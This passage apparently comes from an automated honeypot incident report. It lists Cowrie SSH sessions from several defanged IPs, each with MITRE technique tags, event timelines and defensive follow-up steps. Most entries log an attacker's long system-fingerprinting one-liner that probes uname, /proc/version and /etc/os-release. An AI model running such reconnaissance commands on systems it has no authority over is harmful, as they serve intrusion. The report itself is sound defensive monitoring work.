| `2026-07-05 06:11:06` | `cowrie.client.kex` |
| `2026-07-05 06:11:12` | `cowrie.login.success` |
| `2026-07-05 06:11:15` | `cowrie.session.params` |
| `2026-07-05 06:11:15` | `cowrie.command.input` |
| `2026-07-05 06:11:16` | `cowrie.log.closed` |
| `2026-07-05 06:11:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-766583bc0f3b

| Field | Detail |
|---|---|
| **Source IP** | `207.175.73[.]73` |
| **First Seen** | 2026-07-05 06:11 |
| **Last Seen** | 2026-07-05 06:11 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:11:15` | `cowrie.session.connect` |
| `2026-07-05 06:11:15` | `cowrie.login.success` |
| `2026-07-05 06:11:16` | `cowrie.session.params` |
| `2026-07-05 06:11:16` | `cowrie.command.input` |
| `2026-07-05 06:11:16` | `cowrie.command.failed` |
| `2026-07-05 06:11:27` | `cowrie.log.closed` |
| `2026-07-05 06:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.73[.]73` to AbuseIPDB if not already reported
- [ ] Block `207.175.73[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83c7aa21ab76

| Field | Detail |
|---|---|
| **Source IP** | `207.175.73[.]73` |
| **First Seen** | 2026-07-05 06:11 |
| **Last Seen** | 2026-07-05 06:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:11:17` | `cowrie.session.connect` |
| `2026-07-05 06:11:17` | `cowrie.login.success` |
| `2026-07-05 06:11:18` | `cowrie.session.params` |
| `2026-07-05 06:11:18` | `cowrie.command.input` |
| `2026-07-05 06:11:27` | `cowrie.log.closed` |
| `2026-07-05 06:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.73[.]73` to AbuseIPDB if not already reported
- [ ] Block `207.175.73[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b29e6aa7eaf5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:12 |
| **Last Seen** | 2026-07-05 06:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:12:25` | `cowrie.session.connect` |
| `2026-07-05 06:12:26` | `cowrie.client.version` |
| `2026-07-05 06:12:26` | `cowrie.client.kex` |
| `2026-07-05 06:12:30` | `cowrie.login.success` |
| `2026-07-05 06:12:33` | `cowrie.session.params` |
| `2026-07-05 06:12:33` | `cowrie.command.input` |
| `2026-07-05 06:12:33` | `cowrie.command.input` |
| `2026-07-05 06:12:33` | `cowrie.command.input` |
| `2026-07-05 06:12:33` | `cowrie.command.input` |
| `2026-07-05 06:12:33` | `cowrie.command.input` |
| `2026-07-05 06:12:33` | `cowrie.command.success` |
| `2026-07-05 06:12:33` | `cowrie.command.input` |
| `2026-07-05 06:12:33` | `cowrie.command.input` |
| `2026-07-05 06:12:33` | `cowrie.command.input` |
| `2026-07-05 06:12:33` | `cowrie.command.input` |
| `2026-07-05 06:12:35` | `cowrie.log.closed` |
| `2026-07-05 06:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-185ad92d7ce5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:12 |
| **Last Seen** | 2026-07-05 06:12 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:12:29` | `cowrie.session.connect` |
| `2026-07-05 06:12:31` | `cowrie.client.version` |
| `2026-07-05 06:12:31` | `cowrie.client.kex` |
| `2026-07-05 06:12:35` | `cowrie.login.success` |
| `2026-07-05 06:12:39` | `cowrie.session.params` |
| `2026-07-05 06:12:39` | `cowrie.command.input` |
| `2026-07-05 06:12:39` | `cowrie.command.input` |
| `2026-07-05 06:12:39` | `cowrie.command.input` |
| `2026-07-05 06:12:39` | `cowrie.command.input` |
| `2026-07-05 06:12:39` | `cowrie.command.input` |
| `2026-07-05 06:12:39` | `cowrie.command.success` |
| `2026-07-05 06:12:39` | `cowrie.command.input` |
| `2026-07-05 06:12:39` | `cowrie.command.input` |
| `2026-07-05 06:12:39` | `cowrie.command.input` |
| `2026-07-05 06:12:39` | `cowrie.command.input` |
| `2026-07-05 06:12:41` | `cowrie.log.closed` |
| `2026-07-05 06:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9e66915b8d5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:13 |
| **Last Seen** | 2026-07-05 06:14 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:13:47` | `cowrie.session.connect` |
| `2026-07-05 06:13:49` | `cowrie.client.version` |
| `2026-07-05 06:13:49` | `cowrie.client.kex` |
| `2026-07-05 06:13:55` | `cowrie.login.success` |
| `2026-07-05 06:13:58` | `cowrie.session.params` |
| `2026-07-05 06:13:58` | `cowrie.command.input` |
| `2026-07-05 06:13:58` | `cowrie.command.input` |
| `2026-07-05 06:13:58` | `cowrie.command.input` |
| `2026-07-05 06:13:58` | `cowrie.command.input` |
| `2026-07-05 06:13:58` | `cowrie.command.input` |
| `2026-07-05 06:13:58` | `cowrie.command.success` |
| `2026-07-05 06:13:58` | `cowrie.command.input` |
| `2026-07-05 06:13:58` | `cowrie.command.input` |
| `2026-07-05 06:13:58` | `cowrie.command.input` |
| `2026-07-05 06:13:58` | `cowrie.command.input` |
| `2026-07-05 06:13:59` | `cowrie.log.closed` |
| `2026-07-05 06:14:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e57b8b25400e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:13 |
| **Last Seen** | 2026-07-05 06:14 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:13:56` | `cowrie.session.connect` |
| `2026-07-05 06:13:57` | `cowrie.client.version` |
| `2026-07-05 06:13:57` | `cowrie.client.kex` |
| `2026-07-05 06:14:02` | `cowrie.login.success` |
| `2026-07-05 06:14:07` | `cowrie.session.params` |
| `2026-07-05 06:14:07` | `cowrie.command.input` |
| `2026-07-05 06:14:07` | `cowrie.command.input` |
| `2026-07-05 06:14:07` | `cowrie.command.input` |
| `2026-07-05 06:14:07` | `cowrie.command.input` |
| `2026-07-05 06:14:07` | `cowrie.command.input` |
| `2026-07-05 06:14:07` | `cowrie.command.success` |
| `2026-07-05 06:14:07` | `cowrie.command.input` |
| `2026-07-05 06:14:07` | `cowrie.command.input` |
| `2026-07-05 06:14:07` | `cowrie.command.input` |
| `2026-07-05 06:14:07` | `cowrie.command.input` |
| `2026-07-05 06:14:08` | `cowrie.log.closed` |
| `2026-07-05 06:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45e49528cc24

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 06:14 |
| **Last Seen** | 2026-07-05 06:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:14:34` | `cowrie.session.connect` |
| `2026-07-05 06:14:34` | `cowrie.client.version` |
| `2026-07-05 06:14:34` | `cowrie.client.kex` |
| `2026-07-05 06:14:34` | `cowrie.login.success` |
| `2026-07-05 06:14:35` | `cowrie.session.params` |
| `2026-07-05 06:14:35` | `cowrie.command.input` |
| `2026-07-05 06:14:35` | `cowrie.log.closed` |
| `2026-07-05 06:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cabe127c7ac9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 06:14 |
| **Last Seen** | 2026-07-05 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:14:58` | `cowrie.session.connect` |
| `2026-07-05 06:14:58` | `cowrie.client.version` |
| `2026-07-05 06:14:58` | `cowrie.client.kex` |
| `2026-07-05 06:14:58` | `cowrie.login.success` |
| `2026-07-05 06:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3947241e141d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 06:14 |
| **Last Seen** | 2026-07-05 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:14:58` | `cowrie.session.connect` |
| `2026-07-05 06:14:58` | `cowrie.client.version` |
| `2026-07-05 06:14:58` | `cowrie.client.kex` |
| `2026-07-05 06:14:58` | `cowrie.login.success` |
| `2026-07-05 06:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a49a330652cd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:15 |
| **Last Seen** | 2026-07-05 06:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:15:13` | `cowrie.session.connect` |
| `2026-07-05 06:15:14` | `cowrie.client.version` |
| `2026-07-05 06:15:14` | `cowrie.client.kex` |
| `2026-07-05 06:15:19` | `cowrie.login.success` |
| `2026-07-05 06:15:22` | `cowrie.session.params` |
| `2026-07-05 06:15:22` | `cowrie.command.input` |
| `2026-07-05 06:15:22` | `cowrie.command.input` |
| `2026-07-05 06:15:22` | `cowrie.command.input` |
| `2026-07-05 06:15:22` | `cowrie.command.input` |
| `2026-07-05 06:15:22` | `cowrie.command.input` |
| `2026-07-05 06:15:22` | `cowrie.command.success` |
| `2026-07-05 06:15:22` | `cowrie.command.input` |
| `2026-07-05 06:15:22` | `cowrie.command.input` |
| `2026-07-05 06:15:22` | `cowrie.command.input` |
| `2026-07-05 06:15:22` | `cowrie.command.input` |
| `2026-07-05 06:15:24` | `cowrie.log.closed` |
| `2026-07-05 06:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45df404bc0b0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:15 |
| **Last Seen** | 2026-07-05 06:15 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:15:19` | `cowrie.session.connect` |
| `2026-07-05 06:15:20` | `cowrie.client.version` |
| `2026-07-05 06:15:20` | `cowrie.client.kex` |
| `2026-07-05 06:15:25` | `cowrie.login.success` |
| `2026-07-05 06:15:29` | `cowrie.session.params` |
| `2026-07-05 06:15:29` | `cowrie.command.input` |
| `2026-07-05 06:15:29` | `cowrie.command.input` |
| `2026-07-05 06:15:29` | `cowrie.command.input` |
| `2026-07-05 06:15:29` | `cowrie.command.input` |
| `2026-07-05 06:15:29` | `cowrie.command.input` |
| `2026-07-05 06:15:29` | `cowrie.command.success` |
| `2026-07-05 06:15:29` | `cowrie.command.input` |
| `2026-07-05 06:15:29` | `cowrie.command.input` |
| `2026-07-05 06:15:29` | `cowrie.command.input` |
| `2026-07-05 06:15:29` | `cowrie.command.input` |
| `2026-07-05 06:15:31` | `cowrie.log.closed` |
| `2026-07-05 06:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2837d804de6f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:16 |
| **Last Seen** | 2026-07-05 06:16 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:16:40` | `cowrie.session.connect` |
| `2026-07-05 06:16:42` | `cowrie.client.version` |
| `2026-07-05 06:16:42` | `cowrie.client.kex` |
| `2026-07-05 06:16:50` | `cowrie.login.success` |
| `2026-07-05 06:16:54` | `cowrie.session.params` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.success` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:56` | `cowrie.log.closed` |
| `2026-07-05 06:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a79f2cf7d8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:16 |
| **Last Seen** | 2026-07-05 06:16 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:16:44` | `cowrie.session.connect` |
| `2026-07-05 06:16:45` | `cowrie.client.version` |
| `2026-07-05 06:16:45` | `cowrie.client.kex` |
| `2026-07-05 06:16:50` | `cowrie.login.success` |
| `2026-07-05 06:16:53` | `cowrie.session.params` |
| `2026-07-05 06:16:53` | `cowrie.command.input` |
| `2026-07-05 06:16:53` | `cowrie.command.input` |
| `2026-07-05 06:16:53` | `cowrie.command.input` |
| `2026-07-05 06:16:53` | `cowrie.command.input` |
| `2026-07-05 06:16:53` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.success` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:54` | `cowrie.command.input` |
| `2026-07-05 06:16:55` | `cowrie.log.closed` |
| `2026-07-05 06:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9069fbdb4e7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:18 |
| **Last Seen** | 2026-07-05 06:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:18:08` | `cowrie.session.connect` |
| `2026-07-05 06:18:09` | `cowrie.client.version` |
| `2026-07-05 06:18:09` | `cowrie.client.kex` |
| `2026-07-05 06:18:14` | `cowrie.login.success` |
| `2026-07-05 06:18:18` | `cowrie.session.params` |
| `2026-07-05 06:18:18` | `cowrie.command.input` |
| `2026-07-05 06:18:18` | `cowrie.command.input` |
| `2026-07-05 06:18:18` | `cowrie.command.input` |
| `2026-07-05 06:18:18` | `cowrie.command.input` |
| `2026-07-05 06:18:18` | `cowrie.command.input` |
| `2026-07-05 06:18:18` | `cowrie.command.success` |
| `2026-07-05 06:18:18` | `cowrie.command.input` |
| `2026-07-05 06:18:18` | `cowrie.command.input` |
| `2026-07-05 06:18:18` | `cowrie.command.input` |
| `2026-07-05 06:18:18` | `cowrie.command.input` |
| `2026-07-05 06:18:20` | `cowrie.log.closed` |
| `2026-07-05 06:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62e19a14fe1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:18 |
| **Last Seen** | 2026-07-05 06:18 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:18:11` | `cowrie.session.connect` |
| `2026-07-05 06:18:12` | `cowrie.client.version` |
| `2026-07-05 06:18:12` | `cowrie.client.kex` |
| `2026-07-05 06:18:19` | `cowrie.login.success` |
| `2026-07-05 06:18:23` | `cowrie.session.params` |
| `2026-07-05 06:18:23` | `cowrie.command.input` |
| `2026-07-05 06:18:23` | `cowrie.command.input` |
| `2026-07-05 06:18:23` | `cowrie.command.input` |
| `2026-07-05 06:18:23` | `cowrie.command.input` |
| `2026-07-05 06:18:23` | `cowrie.command.input` |
| `2026-07-05 06:18:23` | `cowrie.command.success` |
| `2026-07-05 06:18:23` | `cowrie.command.input` |
| `2026-07-05 06:18:23` | `cowrie.command.input` |
| `2026-07-05 06:18:23` | `cowrie.command.input` |
| `2026-07-05 06:18:23` | `cowrie.command.input` |
| `2026-07-05 06:18:26` | `cowrie.log.closed` |
| `2026-07-05 06:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
